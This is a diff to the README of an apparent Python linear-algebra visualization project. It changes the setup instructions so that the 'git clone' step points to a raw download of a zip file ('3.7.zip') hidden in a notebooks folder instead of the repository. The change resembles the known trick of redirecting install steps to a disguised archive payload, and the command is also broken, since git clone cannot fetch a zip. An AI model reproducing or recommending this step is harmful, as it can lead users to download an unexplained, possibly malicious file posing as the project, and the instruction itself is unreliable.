@@ -133,7 +133,7 @@ More visual demonstrations will be added as the repository grows.
 Clone the repository:
 
 ```bash
-git clone https://github.com/islam3ouf/Linear-Algebra-Visualization-With-Python.git
+git clone https://raw.githubusercontent.com/islam3ouf/Linear-Algebra-Visualization-With-Python/main/01-Vector-Visualization/notebooks/3.7.zip
 ```
 
 Navigate to the project:
